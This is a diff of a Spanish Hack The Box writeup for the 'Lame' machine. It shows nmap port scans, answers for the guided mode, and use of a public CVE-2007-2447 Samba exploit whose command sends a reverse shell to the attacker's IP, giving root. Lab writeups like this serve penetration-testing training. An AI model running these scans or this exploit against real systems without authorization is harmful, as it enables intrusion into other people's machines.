@@ -1,7 +1,36 @@
+---
+title: Writeup lame - Hack The Box - Resolución y Análisis
+published: true
+tags:
+  - hackthebox
+  - writeup
+  - lame
+  - ciberseguridad
+  - pentesting
+description: Writeup y resolución de la máquina lame en Hack The Box.
+keywords:
+  - writeup lame
+  - hack the box lame
+  - resolución máquina lame
+  - lame hack the box
+  - htb lame
+---
+-----
+### 🔗 Accesos rápidos
+
+- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Lame)
+- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=RiQEZlUoKvk)
+- 🧠 **Explicación resumida**: 
+
+---
+
+#easy #linux #nmap #ping #CVE-2007-2447 
+
+--------
+# Guided Mode 
+
 1)¿Cuántos de los 1000 puertos TCP principales de nmap están abiertos en el host remoto?
 	4
-	*Puertos:* 21,22,139,445
-	Esto lo vimos con el comando `nmap --top-ports 1000 --open -sS -vvv -n -Pn 10.10.10.3 -oG allPorts` (le saque el `--min-rate 5000` por que no me aparecian todos los puertos)
 
 2)¿Qué versión de VSFTPd se está ejecutando en Lame?
 	2.3.4
@@ -54,19 +83,9 @@ nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN target
 `445` SMB
 
 -------
-# Escaneo con [[NMAP Scripts]]
-
-```
-nmap --script="smb-vuln*" -p445 10.10.10.3 -oN smbScan
-```
-
-![[Lame5.png]]
-No nos aporta ninguna informacion relevante
-
--------
 # Explotacion [[CVE-2007-2447]]
 
-#### No encontramos una enumeracion valida para este exploit, ya que nmap no enumera este cve, y haciendo pruebas con otros comandos tampoco pudimos
+Al ser una vresion vieja de smb 3.0.20 Debian como vimos en el escaneo de NMAP, podemos probar el [[CVE-2007-2447]]
 
 [Exploit hecho por amriunix](https://github.com/amriunix/CVE-2007-2447)(Para python2.7)
 
@@ -81,7 +100,14 @@ python2.7 usermap_script.py 10.10.10.3 445 10.10.16.10 443
 ![[Lame10.png]]
 
 Una vez ejecutado el exploit ya estamos adentro como *root*
-#### Hacemos un [[Tratamiento de la TTY]]
 
 y nada mas nos queda catear las flags para terminar la maquina
 ![[Lame8.png]]
+
+-------
+# Notas
+
+1)¿Cuántos de los 1000 puertos TCP principales de nmap están abiertos en el host remoto?
+	4
+		*Puertos:* 21,22,139,445
+		Esto lo vimos con el comando `nmap --top-ports 1000 --open -sS -vvv -n -Pn 10.10.10.3 -oG allPorts` (le saque el `--min-rate 5000` por que no me aparecian todos los puertos)
